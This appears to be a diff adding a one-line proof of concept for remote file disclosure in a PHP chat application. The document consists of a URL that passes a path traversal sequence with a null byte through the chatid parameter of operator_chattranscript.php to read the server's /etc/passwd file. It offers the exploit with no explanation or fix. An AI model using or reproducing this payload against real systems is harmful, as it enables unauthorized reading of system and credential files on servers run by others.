@@ -1,0 +1,11 @@
+RFD PoC:
+
+http://www.server.com/includes/operator_chattranscript.php?chatid=../../../../../../etc/passwd%00
+
+
+
+
+
+
+
+
